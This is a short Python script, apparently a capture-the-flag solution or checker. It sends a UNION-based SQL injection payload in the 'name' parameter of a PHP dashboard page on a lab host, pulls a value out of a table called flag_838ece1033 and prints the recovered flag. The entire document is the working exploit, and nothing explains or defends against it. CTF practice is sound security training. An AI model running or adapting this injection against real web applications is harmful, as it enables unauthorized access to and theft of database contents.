import requests
import re

host = "172.24.218.139"
port = 10001

url = f"http://{host}:{port}"

result = requests.get(url + "/2025-06-02-dashboard.php", params={
    'name':"' union select (select flag from `flag_838ece1033`),2,3,4,5 -- '"
})
flag = re.findall("(flag{.*})", result.text)

assert len(flag) == 1

print(flag[0].strip())